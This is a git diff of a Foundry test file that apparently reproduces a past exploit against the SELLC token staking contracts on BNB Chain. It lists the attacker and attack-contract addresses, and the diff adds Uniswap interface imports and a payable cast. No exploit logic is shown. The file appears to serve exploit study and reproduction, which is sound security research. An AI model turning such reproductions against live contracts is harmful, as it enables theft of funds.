@@ -3,6 +3,13 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // @KeyInfo - Total Lost : unclear US$
 // Attacker : https://bscscan.com/address/0xa3aa817587556c023e78b2285d381c68cee17069
 // Attack Contract : https://bscscan.com/address/0x9a366027e6be5ae8441c9f54455e1d6c41f12e3c
@@ -32,7 +39,7 @@ contract ContractTest is Test {
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
     IUniswapV3Pair Pair = IUniswapV3Pair(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);
-    IUniswapV2Router Router = IUniswapV2Router(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B));
     IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
     IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);
     TOKENA TokenA;
